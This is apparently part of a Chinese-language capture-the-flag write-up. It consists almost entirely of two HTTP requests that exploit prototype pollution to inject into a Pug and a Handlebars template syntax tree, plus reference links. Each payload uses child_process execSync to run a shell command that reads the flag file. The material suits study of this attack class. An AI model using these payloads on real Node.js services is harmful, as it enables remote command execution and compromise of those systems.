## 利用方法

```
POST /api/submit HTTP/1.1
Host: 134.209.22.191:32463
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://134.209.22.191:32463/
Content-Type: application/json
Origin: http://134.209.22.191:32463
Content-Length: 171
Connection: close

{   "artist.name":"Gingell",
    "__proto__.block": {
    "type": "Text", 
    "line": "process.mainModule.require('child_process').execSync(`$(cat flag*)`)"
    }

}
```
```
POST /api/submit HTTP/1.1
Host: 134.209.22.191:32463
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://134.209.22.191:32463/
Content-Type: application/json
Origin: http://134.209.22.191:32463
Content-Length: 392
Connection: close

{   "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`$(cat flag*)`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]

}
```


# 参考链接
[https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#pug
https://blog.p6.is/AST-Injection/](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#pug
https://blog.p6.is/AST-Injection/)